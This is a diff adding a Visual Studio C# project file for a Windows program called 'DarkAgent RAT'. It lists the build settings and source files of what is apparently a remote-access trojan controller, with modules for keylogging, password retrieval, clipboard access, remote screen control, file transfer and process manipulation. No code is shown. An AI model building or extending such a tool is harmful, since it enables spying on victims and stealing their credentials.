@@ -1,0 +1,344 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProductVersion>9.0.30729</ProductVersion>
+    <SchemaVersion>2.0</SchemaVersion>
+    <ProjectGuid>{49AEC145-CFF1-47F6-BAB8-8ACC3CE8A331}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>DarkAgent_RAT</RootNamespace>
+    <AssemblyName>DarkAgent RAT</AssemblyName>
+    <TargetFrameworkVersion>v3.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <SccProjectName>Svn</SccProjectName>
+    <SccLocalPath>Svn</SccLocalPath>
+    <SccAuxPath>Svn</SccAuxPath>
+    <SccProvider>SubversionScc</SccProvider>
+    <NoWin32Manifest>true</NoWin32Manifest>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <FileUpgradeFlags>
+    </FileUpgradeFlags>
+    <UpgradeBackupLocation>
+    </UpgradeBackupLocation>
+    <OldToolsVersion>3.5</OldToolsVersion>
+    <PublishUrl>publish\</PublishUrl>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <MapFileExtensions>true</MapFileExtensions>
+    <ApplicationRevision>0</ApplicationRevision>
+    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <CheckForOverflowUnderflow>false</CheckForOverflowUnderflow>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="DevComponents.DotNetBar2">
+      <HintPath>..\DevComponents.DotNetBar2.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Speech">
+      <RequiredTargetFramework>3.0</RequiredTargetFramework>
+    </Reference>
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="ClipboardManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ClipboardManager.Designer.cs">
+      <DependentUpon>ClipboardManager.cs</DependentUpon>
+    </Compile>
+    <Compile Include="CreateListener.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="CreateListener.Designer.cs">
+      <DependentUpon>CreateListener.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FileManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FileManager.Designer.cs">
+      <DependentUpon>FileManager.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Form1.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.cs">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Keylogger.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Keylogger.Designer.cs">
+      <DependentUpon>Keylogger.cs</DependentUpon>
+    </Compile>
+    <Compile Include="LoadedDll.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="LoadedDll.Designer.cs">
+      <DependentUpon>LoadedDll.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Passwords.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Passwords.Designer.cs">
+      <DependentUpon>Passwords.cs</DependentUpon>
+    </Compile>
+    <Compile Include="RemoteControl.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="RemoteControl.Designer.cs">
+      <DependentUpon>RemoteControl.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ProcessMgr.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ProcessMgr.Designer.cs">
+      <DependentUpon>ProcessMgr.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ProcessorInfo.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ProcessorInfo.Designer.cs">
+      <DependentUpon>ProcessorInfo.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ProcessThreads.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ProcessThreads.Designer.cs">
+      <DependentUpon>ProcessThreads.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <EmbeddedResource Include="ClipboardManager.resx">
+      <DependentUpon>ClipboardManager.cs</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="CreateListener.resx">
+      <DependentUpon>CreateListener.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FileManager.resx">
+      <DependentUpon>FileManager.cs</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.cs</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Keylogger.resx">
+      <DependentUpon>Keylogger.cs</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="LoadedDll.resx">
+      <DependentUpon>LoadedDll.cs</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Passwords.resx">
+      <DependentUpon>Passwords.cs</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="RemoteControl.resx">
+      <DependentUpon>RemoteControl.cs</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ProcessMgr.resx">
+      <DependentUpon>ProcessMgr.cs</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ProcessorInfo.resx">
+      <DependentUpon>ProcessorInfo.cs</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ProcessThreads.resx">
+      <DependentUpon>ProcessThreads.cs</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="src\Engines\CryptEngine.cs" />
+    <Compile Include="src\Events\ClientDisconnect.cs" />
+    <Compile Include="src\Events\ClipboardEvent.cs" />
+    <Compile Include="src\Events\CpuInfoEvent.cs" />
+    <Compile Include="src\Events\FileMgrDirEvent.cs" />
+    <Compile Include="src\Events\FileMgrDrives.cs" />
+    <Compile Include="src\Events\FileMgrFilEvent.cs" />
+    <Compile Include="src\Events\KeyloggerEvent.cs" />
+    <Compile Include="src\Events\PasswordEvent.cs" />
+    <Compile Include="src\Events\ProcessDllEvent.cs" />
+    <Compile Include="src\Events\ProcessEvent.cs" />
+    <Compile Include="src\Events\ProcessThreadEvent.cs" />
+    <Compile Include="src\Events\RemoteControlEvent.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Receive\R_FileMgrDrives.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Receive\R_FileMgrGetFiles.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Receive\R_FileMgrGetFolders.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Receive\R_GetClipboard.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Receive\R_RemoteIP.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_GetClipboard.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_RemoteKeyboard.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_SetClipboard.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_SetWallpaper.cs" />
+    <Compile Include="src\Network\FileServer\Packets\Receive\R_FileTransferBegin.cs" />
+    <Compile Include="src\Network\FileServer\Packets\Receive\R_FileTransferEnd.cs" />
+    <Compile Include="src\Network\FileServer\Packets\Receive\R_FileTransferSend.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Receive\R_GetCpuInfo.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Receive\R_GetPasswords.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Receive\R_GetProcessDLLs.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Receive\R_GetProcesses.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Receive\R_GetProcessThreads.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Receive\R_KeyStrokes.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_CopyFile.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_CreateFile.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_CursorPosition.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_DeleteFile.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_FileMgrGetDrives.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_FileMgrGetFiles.cs" />
+    <Compile Include="src\Network\FileServer\Packets\Send\S_FileTransferSend.cs" />
+    <Compile Include="src\Network\FileServer\Packets\Send\S_FileTransferSendBegin.cs" />
+    <Compile Include="src\Network\FileServer\Packets\Send\S_FileTransferSendComplete.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_GetCpuInfo.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_GetKeyStrokes.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_GetPasswords.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_GetProcesses.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_GetProcessesDLLs.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_GetProcessThreads.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_KillProcess.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_MessageBox.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_ProcessModThread.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_ProcessWindowText.cs" />
+    <Compile Include="src\Network\FileServer\Packets\Send\S_RemoteControlScreen.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_ResumeProcess.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_StartProcess.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Send\S_SuspendProcess.cs" />
+    <Compile Include="src\Network\FileServer\FileClientListener.cs" />
+    <Compile Include="src\Network\FileServer\FileClientProcessor.cs" />
+    <Compile Include="src\Network\FileServer\FileClients.cs" />
+    <Compile Include="src\Network\FileServer\Packets\FileClientPacketProcessor.cs" />
+    <Compile Include="src\Network\FileServer\Packets\ReceiveBasePacket.cs" />
+    <Compile Include="src\Network\FileServer\Packets\SendBasePacket.cs" />
+    <Compile Include="src\Network\FileServer\Packets\Send\S_RemoteIP.cs" />
+    <Compile Include="src\Objects\CpuInfo.cs" />
+    <Compile Include="src\Objects\FileMgrDirInfo.cs" />
+    <Compile Include="src\Objects\FileMgrDrives.cs" />
+    <Compile Include="src\Objects\FileMgrFileInfo.cs" />
+    <Compile Include="src\Objects\FileTransfer.cs" />
+    <Compile Include="src\Objects\PasswordInfo.cs" />
+    <Compile Include="src\Objects\ProcessDllInfo.cs" />
+    <Compile Include="src\Objects\ProcessInfo.cs" />
+    <Compile Include="src\Objects\ProcessThreadInfo.cs" />
+    <Compile Include="src\Utils\ClipboardBuilder.cs" />
+    <Compile Include="src\Utils\ColumnSorter.cs" />
+    <Compile Include="src\Utils\LibCalls.cs" />
+    <Compile Include="src\Utils\Logger.cs" />
+    <Compile Include="src\Network\DataNetwork\FloodProtector.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\ClientPacketProcessor.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\ReceiveBasePacket.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\Receive\R_NewClient.cs" />
+    <Compile Include="src\Network\DataNetwork\Packets\SendBasePacket.cs" />
+    <Compile Include="src\Network\DataNetwork\RatClientListener.cs" />
+    <Compile Include="src\Network\DataNetwork\RatClientProcessor.cs" />
+    <Compile Include="src\Network\DataNetwork\RatClients.cs" />
+    <Compile Include="src\Utils\settings.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\s_really.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <BootstrapperPackage Include="Microsoft.Net.Client.3.5">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1 Client Profile</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.2.0">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 2.0 %28x86%29</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.0">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.0 %28x86%29</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="Resources\Folder.gif" />
+    <Content Include="Resources\harddrive.gif" />
+  </ItemGroup>
+  <ItemGroup>
+    <COMReference Include="NATUPNPLib">
+      <Guid>{1C565858-F302-471E-B409-F180AA4ABEC6}</Guid>
+      <VersionMajor>1</VersionMajor>
+      <VersionMinor>0</VersionMinor>
+      <Lcid>0</Lcid>
+      <WrapperTool>tlbimp</WrapperTool>
+      <Isolated>False</Isolated>
+    </COMReference>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+  <PropertyGroup>
+    <PostBuildEvent>C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe install "$(TargetPath)"</PostBuildEvent>
+  </PropertyGroup>
+</Project>
